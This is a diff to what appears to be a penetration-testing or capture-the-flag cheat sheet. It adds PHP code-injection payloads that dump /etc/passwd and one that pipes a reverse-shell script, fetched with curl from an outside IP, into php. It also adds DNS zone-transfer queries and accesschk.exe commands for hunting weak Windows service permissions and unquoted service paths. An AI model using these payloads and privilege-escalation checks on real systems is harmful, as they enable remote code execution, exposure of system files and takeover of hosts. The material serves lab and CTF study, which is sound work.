@@ -606,6 +606,10 @@ Reference: https://www.ush.it/2009/02/08/php-filesystem-attack-vectors/
 # avoid black listed extensions or words
 ciccio.php/.
 ciccio.php/
+# alternative
+' and die(show_source("/etc/passwd")) or '
+encoded: '%20and%20die(show_source(%22/etc/passwd%22))%20or%20'
+' and die(system("curl http://192.168.68.108/revshell.php|php")) or '
 ```
 
 [redis-cli]
@@ -623,3 +627,13 @@ https://github.com/w181496/Web-CTF-Cheatsheet/blob/master/README.md
 
 [dns | dig]
 dig axfr @192.168.0.102 webmaster.htb
+dig any @192.168.0.102 webmaster.htb
+
+[accesschk.exe]
+# check service permission to the user
+accesschk.exe /accepteula -uwcqv user <service>
+# check service with unquoted path
+accesschk.exe /accepteula -ucqv user
+# check writable path
+accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
+
